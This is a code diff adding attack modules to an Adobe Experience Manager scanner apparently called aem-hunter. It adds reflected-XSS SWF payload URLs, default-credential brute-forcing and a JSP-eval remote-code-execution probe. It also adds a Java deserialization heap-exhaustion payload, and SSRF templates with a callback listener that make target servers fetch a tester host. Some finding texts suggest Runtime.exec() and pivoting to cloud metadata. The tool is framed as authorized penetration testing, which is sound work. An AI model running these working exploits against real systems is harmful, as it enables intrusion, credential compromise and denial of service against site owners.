@@ -66,6 +66,7 @@ import threading
 import time
 import urllib.parse as up
 from dataclasses import dataclass, field, asdict
+from http.server import BaseHTTPRequestHandler, HTTPServer
 from typing import Any, Callable, Dict, Iterable, List, Optional, Set, Tuple, Union
 
 try:
@@ -321,6 +322,99 @@ RE_SECRET = re.compile(
     r"-----BEGIN [A-Z ]*PRIVATE KEY-----"
     r")"
 )
+
+# ---------------------------------------------------------------------------
+# Reflected-XSS-prone SWF files (from 0ang3el/aem-hacker). Present + correct
+# content-type (and no Content-Disposition) => likely reflected XSS sink.
+# ---------------------------------------------------------------------------
+SWF_XSS_PATHS = [
+    "/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf?onclick=javascript:confirm(document.domain)",
+    "/etc/clientlibs/foundation/shared/endorsed/swf/slideshow.swf?contentPath=%5c%22))%7dcatch(e)%7balert(document.domain)%7d//",
+    "/etc/clientlibs/foundation/video/swf/StrobeMediaPlayback.swf?javascriptCallbackFunction=alert(document.domain)-String",
+    "/libs/dam/widgets/resources/swfupload/swfupload_f9.swf?movieName=%22])%7dcatch(e)%7balert(document.domain)%7d//",
+    "/libs/cq/ui/resources/swfupload/swfupload.swf?movieName=%22])%7dcatch(e)%7balert(document.domain)%7d//",
+    "/etc/dam/viewers/s7sdk/2.11/flash/VideoPlayer.swf?stagesize=1&namespacePrefix=alert(document.domain)-window",
+]
+
+# ---------------------------------------------------------------------------
+# Out-of-band SSRF detector (ported from aem-hacker). When --ssrf-callback is
+# given, a tiny HTTP listener records callbacks; SSRF servlets are told to fetch
+# http://<callback>/<token>/<servletkey>/<id>/ and a hit confirms blind SSRF.
+# Needs the AEM target to be able to reach the tester host (won't work via a
+# forward proxy like Burp — use an interactsh-style public listener/VPS).
+# ---------------------------------------------------------------------------
+SSRF_TOKEN = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
+SSRF_HITS: Dict[str, List[str]] = {}
+SSRF_HITS_LOCK = threading.Lock()
+
+# (key, method, [url templates with {cb}], data template or None, cve)
+SSRF_OOB_SERVLETS: List[Tuple[str, str, List[str], Optional[str], Optional[str]]] = [
+    ("salesforcesecret", "GET", [
+        "/libs/mcm/salesforce/customer.json?customer_key=x&customer_secret=y&refresh_token=z&instance_url={cb}%23",
+        "/libs/mcm/salesforce/customer.json?checkType=authorize&authorization_url={cb}&customer_key=z&customer_secret=z&redirect_uri=x&code=e",
+        "///libs///mcm///salesforce///customer.json?customer_key=x&customer_secret=y&refresh_token=z&instance_url={cb}%23",
+    ], None, "CVE-2018-5006"),
+    ("reportingservices", "GET", [
+        "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet?url={cb}%23/api1.omniture.com/a&q=a",
+        "/libs/cq/contentinsight/content/proxy.reportingservices.json?url={cb}%23/api1.omniture.com/a&q=a",
+    ], None, "CVE-2018-12809"),
+    ("sitecatalyst", "GET", [
+        "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet?datacenter={cb}%23&company=x&username=z&secret=y",
+        "/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json?datacenter={cb}%23&company=x&username=z&secret=y",
+    ], None, None),
+    ("autoprovisioning", "POST", [
+        "/libs/cq/cloudservicesprovisioning/content/autoprovisioning.json",
+    ], "servicename=analytics&analytics.server={cb}&analytics.company=1&analytics.username=2&analytics.secret=3&analytics.reportsuite=4", None),
+    ("opensocialproxy", "GET", [
+        "/libs/opensocial/proxy.json?container=default&url={cb}",
+        "/libs/opensocial/proxy?container=default&url={cb}",
+    ], None, None),
+    ("opensocialmakerequest", "POST", [
+        "/libs/opensocial/makeRequest.json?url={cb}",
+        "/libs/opensocial/makeRequest?url={cb}",
+    ], "httpMethod=GET", None),
+    ("linkchecker", "GET", [
+        "/libs/wcm/resources/linkchecker.json?path={cb}",
+    ], None, None),
+]
+
+
+class _SSRFDetector(BaseHTTPRequestHandler):
+    def log_message(self, *a):
+        return
+
+    def do_GET(self):
+        self._serve()
+
+    def do_POST(self):
+        self._serve()
+
+    def do_PUT(self):
+        self._serve()
+
+    def _serve(self):
+        try:
+            parts = self.path.split("/")
+            tok, key = parts[1], parts[2]
+        except Exception:
+            self.send_response(200); self.end_headers(); return
+        if tok == SSRF_TOKEN:
+            with SSRF_HITS_LOCK:
+                SSRF_HITS.setdefault(key, []).append(self.path)
+        self.send_response(200)
+        self.end_headers()
+
+
+def start_ssrf_listener(bind_port: int, logger: "Logger"):
+    try:
+        srv = HTTPServer(("0.0.0.0", bind_port), _SSRFDetector)
+    except Exception as e:
+        logger.err(f"Could not start OOB SSRF listener on :{bind_port}: {e}")
+        return None
+    threading.Thread(target=srv.serve_forever, daemon=True).start()
+    logger.good(f"OOB SSRF listener bound on 0.0.0.0:{bind_port} (token={SSRF_TOKEN})")
+    return srv
+
 
 # ---------------------------------------------------------------------------
 # Logger
@@ -699,7 +793,8 @@ class AEMHunter:
     def __init__(self, target: str, logger: Logger, reporter: Reporter,
                  client: HttpClient, threads: int = 10, role: Optional[str] = None,
                  enable_modules: Optional[Set[str]] = None,
-                 fuzz_aggression: str = "normal", exploit: bool = False):
+                 fuzz_aggression: str = "normal", exploit: bool = False,
+                 ssrf_callback: Optional[str] = None):
         self.target = target
         self.logger = logger
         self.reporter = reporter
@@ -709,6 +804,7 @@ class AEMHunter:
         self.enable_modules = enable_modules  # None means all
         self.fuzz_aggression = fuzz_aggression  # quick / normal / aggressive
         self.exploit = exploit  # enable destructive end-to-end PoCs (JSP RCE, admin add)
+        self.ssrf_callback = ssrf_callback  # host:port for out-of-band SSRF checks
         self._fingerprint: Dict[str, Any] = {}
         self._csrf_token: Optional[str] = None
 
@@ -2529,6 +2625,268 @@ class AEMHunter:
                 ))
 
     # =======================================================================
+    # 18. Extra exposed servlets (ported from 0ang3el/aem-hacker)
+    # =======================================================================
+    def check_aemhacker_servlets(self) -> None:
+        if not self._enabled("servlets"):
+            return
+        self.logger.section("Extra servlet exposure probes (aem-hacker)")
+        ref = {"Referer": self.client.base_url}
+
+        # --- GQLServlet: /bin/wcm/search/gql -> JSON with 'hits' ---
+        for p in ("/bin/wcm/search/gql.servlet.json?query=type:base%20limit:..1&pathPrefix=",
+                  "/bin/wcm/search/gql.json?query=type:base%20limit:..1&pathPrefix=",
+                  "/bin/wcm/search/gql.json;%0aa.css?query=type:base%20limit:..1&pathPrefix="):
+            r = self.client.get(p)
+            if r is not None and r.status_code == 200 and not self._is_authwall(r) and '"hits"' in (r.text or ""):
+                self.reporter.add(Finding(
+                    title=f"GQLServlet exposed {self._role_tag()}",
+                    severity=SEV_HIGH, category=CAT_DISCLOSURE, target=self.target + p,
+                    evidence="GQL query returned 'hits' JSON.",
+                    description="Apache Jackrabbit GQL search servlet is reachable — enumerate "
+                                "JCR content/users via GQL queries.",
+                    references=["https://github.com/0ang3el/aem-hacker"],
+                    request=self.client.request_signature("GET", p),
+                    response_snippet=safe_response_text(r, 400), role=self.role))
+                break
+
+        # --- LoginStatusServlet: exposure + default-credential bruteforce ---
+        for p in ("/system/sling/loginstatus.json", "/system/sling/loginstatus.css",
+                  "///system///sling///loginstatus.json", "/system/sling/loginstatus.json;%0aa.css"):
+            r = self.client.get(p)
+            if r is not None and r.status_code == 200 and "authenticated=" in (r.text or ""):
+                self.reporter.add(Finding(
+                    title=f"LoginStatusServlet exposed {self._role_tag()}",
+                    severity=SEV_LOW, category=CAT_DISCLOSURE, target=self.target + p,
+                    evidence="loginstatus returns 'authenticated=' — usable to validate creds.",
+                    description="Lets an attacker validate/bruteforce credentials without lockout.",
+                    references=["https://github.com/0ang3el/aem-hacker"],
+                    request=self.client.request_signature("GET", p), role=self.role))
+                # Try default creds against it (strong positive on authenticated=true).
+                for user, pw in DEFAULT_CREDENTIALS[:14]:
+                    tok = base64.b64encode(f"{user}:{pw}".encode()).decode()
+                    rr = self.client.get(p, headers={"Authorization": f"Basic {tok}"})
+                    if rr is not None and "authenticated=true" in (rr.text or ""):
+                        self.reporter.add(Finding(
+                            title=f"Default credentials accepted: {user}:{pw}",
+                            severity=SEV_CRITICAL, category=CAT_AUTH, target=self.target + p,
+                            evidence=f"loginstatus reported authenticated=true for {user}:{pw}",
+                            description="A well-known default credential is valid -> admin access -> RCE.",
+                            references=["https://github.com/0ang3el/aem-hacker"], role=self.role))
+                break
+
+        # --- WCMDebugFilter reflected XSS (CVE-2016-7882) ---
+        for p in ("/.json?debug=layout", "/content.json?debug=layout", "/content.json/a.css?debug=layout"):
+            r = self.client.get(p)
+            if r is not None and r.status_code == 200 and not self._is_authwall(r):
+                body = r.text or ""
+                if "res=" in body and "sel=" in body:
+                    self.reporter.add(Finding(
+                        title=f"WCMDebugFilter reflected XSS (CVE-2016-7882) {self._role_tag()}",
+                        severity=SEV_MEDIUM, category=CAT_XSS, target=self.target + p,
+                        evidence="debug=layout reflected res=/sel= markers.",
+                        description="WCMDebugFilter is enabled and reflects the debug selector — "
+                                    "reflected XSS. Confirm the payload renders in a browser.",
+                        references=["https://nvd.nist.gov/vuln/detail/CVE-2016-7882"],
+                        request=self.client.request_signature("GET", p), role=self.role))
+                    break
+
+        # --- WCMSuggestionsServlet reflected XSS ---
+        xmark = "x" + "".join(random.choices(string.ascii_lowercase, k=8)) + "x"
+        for p in ("/bin/wcm/contentfinder/connector/suggestions.json?query_term=path%3a/&pre=<{m}>&post=y",
+                  "/bin/wcm/contentfinder/connector/suggestions.json/a.css?query_term=path%3a/&pre=<{m}>&post=y"):
+            pp = p.format(m=xmark)
+            r = self.client.get(pp)
+            if r is not None and r.status_code == 200 and f"<{xmark}>" in (r.text or ""):
+                self.reporter.add(Finding(
+                    title=f"WCMSuggestionsServlet reflected XSS {self._role_tag()}",
+                    severity=SEV_MEDIUM, category=CAT_XSS, target=self.target + pp,
+                    evidence=f"Unescaped marker <{xmark}> reflected in response.",
+                    description="contentfinder suggestions servlet reflects 'pre'/'post' unescaped -> XSS.",
+                    references=["https://github.com/0ang3el/aem-hacker"],
+                    request=self.client.request_signature("GET", pp),
+                    response_snippet=safe_response_text(r, 300), role=self.role))
+                break
+
+        # --- AuditLogServlet ---
+        for p in ("/bin/msm/audit.json", "/bin/msm/audit.json;%0aa.css", "///bin///msm///audit.json"):
+            r = self.client.get(p)
+            if r is not None and r.status_code == 200 and not self._is_authwall(r):
+                try:
+                    if int(json.loads(r.text).get("results", 0)) > 0:
+                        self.reporter.add(Finding(
+                            title=f"AuditLogServlet exposed {self._role_tag()}",
+                            severity=SEV_MEDIUM, category=CAT_DISCLOSURE, target=self.target + p,
+                            evidence="audit servlet returned audit records.",
+                            description="MSM audit log records are exposed (who-changed-what disclosure).",
+                            references=["https://github.com/0ang3el/aem-hacker"],
+                            request=self.client.request_signature("GET", p), role=self.role))
+                        break
+                except Exception:
+                    pass
+
+        # --- CRXDE logs ---
+        for p in ("/bin/crxde/logs?tail=100", "/bin/crxde/logs.html?tail=100",
+                  "/bin/crxde/logs;%0aa.css?tail=100", "///bin///crxde///logs?tail=100"):
+            r = self.client.get(p)
+            if r is not None and r.status_code == 200 and ("*WARN*" in (r.text or "") or "*INFO*" in (r.text or "") or "*ERROR*" in (r.text or "")):
+                self.reporter.add(Finding(
+                    title=f"CRXDE logs exposed {self._role_tag()}",
+                    severity=SEV_MEDIUM, category=CAT_DISCLOSURE, target=self.target + p,
+                    evidence="Live error.log tail is readable.",
+                    description="CRXDE log tailing is exposed — leaks paths, stack traces, internals.",
+                    references=["https://github.com/0ang3el/aem-hacker"],
+                    request=self.client.request_signature("GET", p),
+                    response_snippet=safe_response_text(r, 300), role=self.role))
+                break
+
+        # --- Disk Usage report ---
+        for p in ("/etc/reports/diskusage.html", "///etc///reports///diskusage.html"):
+            r = self.client.get(p)
+            if r is not None and r.status_code == 200 and not self._is_authwall(r) and "Disk Usage" in (r.text or ""):
+                self.reporter.add(Finding(
+                    title=f"Disk Usage report exposed {self._role_tag()}",
+                    severity=SEV_LOW, category=CAT_DISCLOSURE, target=self.target + p,
+                    evidence="'Disk Usage' report rendered.",
+                    description="Operational disk-usage report exposed (minor info disclosure).",
+                    references=["https://github.com/0ang3el/aem-hacker"],
+                    request=self.client.request_signature("GET", p), role=self.role))
+                break
+
+        # --- Reflected XSS via exposed SWF files ---
+        for p in SWF_XSS_PATHS:
+            r = self.client.get(p)
+            if r is None or r.status_code != 200:
+                continue
+            ct = (r.headers.get("Content-Type", "") or "").split(";")[0].strip().lower()
+            cd = r.headers.get("Content-Disposition", "")
+            if ct == "application/x-shockwave-flash" and not cd:
+                self.reporter.add(Finding(
+                    title=f"Reflected XSS via exposed SWF {self._role_tag()}",
+                    severity=SEV_MEDIUM, category=CAT_XSS, target=self.target + p.split("?")[0],
+                    evidence="SWF served with x-shockwave-flash content-type and no Content-Disposition.",
+                    description="A known XSS-prone Flash file is served inline — reflected XSS in "
+                                "older browsers / Flash-enabled clients.",
+                    references=["https://github.com/0ang3el/aem-hacker"],
+                    request=self.client.request_signature("GET", p), role=self.role))
+                break
+
+    # =======================================================================
+    # 19. ACS AEM Tools 'Fiddle' RCE (JSP eval) — ported from aem-hacker
+    # =======================================================================
+    def check_acs_fiddle(self) -> None:
+        if not self._enabled("acs"):
+            return
+        self.logger.section("ACS AEM Tools Fiddle probe")
+        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
+        expected = str(a * b)  # appears only if the JSP is EVALUATED (not in source)
+        jsp = f"<%= {a} * {b} %>"
+        data = "scriptdata=" + up.quote(jsp) + "&scriptext=jsp&resource="
+        fiddle_paths = (
+            "/etc/acs-tools/aem-fiddle/_jcr_content.run.html",
+            "/etc/acs-tools/aem-fiddle/_jcr_content.run.html/a.css",
+            "/etc/acs-tools/aem-fiddle/_jcr_content.run.4.2.1...html",
+        )
+        for p in fiddle_paths:
+            for auth in (None, base64.b64encode(b"admin:admin").decode()):
+                hdr = {"Content-Type": "application/x-www-form-urlencoded",
+                       "Referer": self.client.base_url}
+                if auth:
+                    hdr["Authorization"] = f"Basic {auth}"
+                if self._csrf_token:
+                    hdr["CSRF-Token"] = self._csrf_token
+                r = self.client.post(p, data=data, headers=hdr)
+                if r is not None and r.status_code == 200 and expected in (r.text or ""):
+                    who = "admin:admin" if auth else (self.role or "anonymous")
+                    self.reporter.add(Finding(
+                        title=f"ACS AEM Tools Fiddle RCE ({who})",
+                        severity=SEV_CRITICAL, category=CAT_RCE, target=self.target + p,
+                        evidence=f"JSP eval executed: {a}*{b} returned {expected}.",
+                        description=("ACS AEM Tools 'Fiddle' is exposed and evaluates attacker JSP "
+                                     "server-side — remote code execution. Swap the expression for "
+                                     "Runtime.exec() for OS command execution."),
+                        references=["https://adobe-consulting-services.github.io/acs-aem-tools/"],
+                        request=f"POST {p} (scriptdata=<%= {a} * {b} %>&scriptext=jsp)",
+                        response_snippet=snippet(r.text, 200), role=self.role))
+                    return
+        # predicates endpoint = ACS tools present (info)
+        r = self.client.get("/bin/acs-tools/qe/predicates.json")
+        if r is not None and r.status_code == 200 and "relativedaterange" in (r.text or ""):
+            self.reporter.add(Finding(
+                title=f"ACS AEM Tools present {self._role_tag()}",
+                severity=SEV_LOW, category=CAT_EXPOSURE,
+                target=self.target + "/bin/acs-tools/qe/predicates.json",
+                evidence="ACS Tools predicates endpoint reachable.",
+                description="ACS AEM Tools installed; check the Fiddle for RCE with higher privs.",
+                references=["https://adobe-consulting-services.github.io/acs-aem-tools/"],
+                role=self.role))
+
+    # =======================================================================
+    # 20. ExternalJobServlet Java deserialization (aggressive -> --exploit)
+    # =======================================================================
+    def check_externaljob_deser(self) -> None:
+        if not self._enabled("deser") or not self.exploit:
+            return
+        self.logger.section("ExternalJobServlet deserialization probe (--exploit)")
+        # oisdos ObjectArrayHeap probe: deser triggers a huge array alloc -> OOM error.
+        payload = base64.b64decode("rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////c=")
+        for p in ("/libs/dam/cloud/proxy.json", "/libs/dam/cloud/proxy.html",
+                  "/libs/dam/cloud/proxy.json;%0aa.css"):
+            files = {":operation": (None, "job"),
+                     "file": ("jobevent", payload, "application/octet-stream")}
+            r = self.client.post(p, files=files, headers={"Referer": self.client.base_url})
+            if r is not None and r.status_code == 500 and "Java heap space" in (r.text or ""):
+                self.reporter.add(Finding(
+                    title=f"ExternalJobServlet Java deserialization {self._role_tag()}",
+                    severity=SEV_CRITICAL, category=CAT_RCE, target=self.target + p,
+                    evidence="Heap-exhaustion deser probe triggered 'Java heap space' (deserialization confirmed).",
+                    description=("ExternalJobServlet deserializes attacker-controlled data. With a "
+                                 "gadget chain on the classpath this is RCE. Validate with ysoserial."),
+                    references=["https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps"],
+                    request=f"POST {p} (multipart :operation=job, file=<java-serialized>)",
+                    role=self.role))
+                return
+
+    # =======================================================================
+    # 21. Out-of-band SSRF (listener) — ported from aem-hacker
+    # =======================================================================
+    def check_ssrf_oob(self) -> None:
+        if not self._enabled("ssrfoob") or not self.ssrf_callback:
+            return
+        self.logger.section("Out-of-band SSRF probes (callback listener)")
+        rid = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
+        base = self.client.base_url
+        for key, method, templates, data_tmpl, cve in SSRF_OOB_SERVLETS:
+            back = f"http://{self.ssrf_callback}/{SSRF_TOKEN}/{key}/{rid}/"
+            for tmpl in templates:
+                try:
+                    path = tmpl.format(cb=back)
+                    if method == "GET":
+                        self.client.get(path, headers={"Referer": base})
+                    else:
+                        data = (data_tmpl or "").format(cb=back)
+                        self.client.post(path, data=data, headers={
+                            "Content-Type": "application/x-www-form-urlencoded", "Referer": base})
+                except Exception:
+                    pass
+        self.logger.info("Fired SSRF probes; waiting 8s for callbacks...")
+        time.sleep(8)
+        for key, method, templates, data_tmpl, cve in SSRF_OOB_SERVLETS:
+            with SSRF_HITS_LOCK:
+                hits = list(SSRF_HITS.get(key, []))
+            if hits:
+                self.reporter.add(Finding(
+                    title=f"Out-of-band SSRF confirmed via {key} {self._role_tag()}",
+                    severity=SEV_CRITICAL, category=CAT_SSRF, target=self.target, cve=cve,
+                    evidence=f"AEM server called back to the listener ({len(hits)} hit(s)).",
+                    description=("Blind SSRF confirmed out-of-band — the AEM server fetched an "
+                                 "attacker-controlled URL. Pivot to internal services / cloud "
+                                 "metadata, and build SSRF->RCE per 0ang3el's research."),
+                    references=["https://github.com/0ang3el/aem-hacker",
+                                "https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps"],
+                    role=self.role))
+
+    # =======================================================================
     # Orchestrator
     # =======================================================================
     def run(self) -> None:
@@ -2548,6 +2906,10 @@ class AEMHunter:
             self.check_legacy_cves()
             self.check_sling_post_servlet()
             self.check_source_disclosure()
+            self.check_aemhacker_servlets()
+            self.check_acs_fiddle()
+            self.check_externaljob_deser()
+            self.check_ssrf_oob()
             self.check_misc()
             self.check_authenticated_role()
             self.check_bundle_upload()
@@ -2708,7 +3070,8 @@ def write_reports(target: str, findings: List[Finding], summary: Dict[str, int],
 # ---------------------------------------------------------------------------
 def run_one_scan(target: str, cookies: Optional[Dict[str, str]], label: str,
                  proxy: Optional[str], output_dir: str, logger: Logger,
-                 exploit: bool = False, use_http2: bool = False) -> List[str]:
+                 exploit: bool = False, use_http2: bool = False,
+                 ssrf_callback: Optional[str] = None) -> List[str]:
     logger.section(f"SCAN: {label}")
     reporter = Reporter(logger)
 
@@ -2775,6 +3138,7 @@ def run_one_scan(target: str, cookies: Optional[Dict[str, str]], label: str,
         target=target, logger=logger, reporter=reporter, client=client,
         threads=10, role=(label if cookies else None),
         enable_modules=None, fuzz_aggression="normal", exploit=exploit,
+        ssrf_callback=ssrf_callback,
     )
     hunter.run()
 
@@ -2821,8 +3185,12 @@ def parse_args() -> argparse.Namespace:
                         "HTTP/2. Needs: pip install 'httpx[http2]'. Avoids needing a downgrading proxy.")
     p.add_argument("-o", "--output-dir", default=".", help="Where to write reports (default: current dir)")
     p.add_argument("--exploit", action="store_true",
-                   help="Enable destructive end-to-end PoCs: JSP RCE (drops+removes a canary) "
-                        "and admin-group escalation. Authorized targets only.")
+                   help="Enable destructive end-to-end PoCs: JSP RCE (drops+removes a canary), "
+                        "admin-group escalation, ExternalJob deserialization probe. Authorized only.")
+    p.add_argument("--ssrf-callback", metavar="HOST:PORT",
+                   help="Enable out-of-band SSRF checks. HOST:PORT is the tester-reachable "
+                        "address the AEM server should call back to; a local listener is started "
+                        "on PORT to catch hits. (Needs the target to reach you — not via Burp.)")
     p.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
     p.add_argument("--version", action="version", version=f"aem-hunter {VERSION}")
     return p.parse_args()
@@ -2872,6 +3240,18 @@ def main() -> int:
     if ns.exploit:
         logger.warn("--exploit ON: will attempt JSP RCE PoC + admin escalation (with cleanup). "
                     "Authorized targets only.")
+    ssrf_callback = None
+    if ns.ssrf_callback:
+        ssrf_callback = ns.ssrf_callback.strip()
+        try:
+            bind_port = int(ssrf_callback.rsplit(":", 1)[1])
+        except (IndexError, ValueError):
+            logger.err("--ssrf-callback must be HOST:PORT (e.g. 1.2.3.4:8000)")
+            return 2
+        if start_ssrf_listener(bind_port, logger) is None:
+            ssrf_callback = None
+        else:
+            logger.info(f"OOB SSRF callback: http://{ssrf_callback}/ (target must reach this)")
     print()
     logger.info("How this works:")
     logger.info("  - Paste a Cookie header + Enter  -> authenticated scan with those cookies")
@@ -2916,7 +3296,8 @@ def main() -> int:
 
         try:
             all_reports.extend(run_one_scan(target, cookies, label, proxy, output_dir,
-                                            logger, exploit=ns.exploit, use_http2=ns.http2))
+                                            logger, exploit=ns.exploit, use_http2=ns.http2,
+                                            ssrf_callback=ssrf_callback))
         except KeyboardInterrupt:
             logger.warn("Scan interrupted; moving on.")
         print()
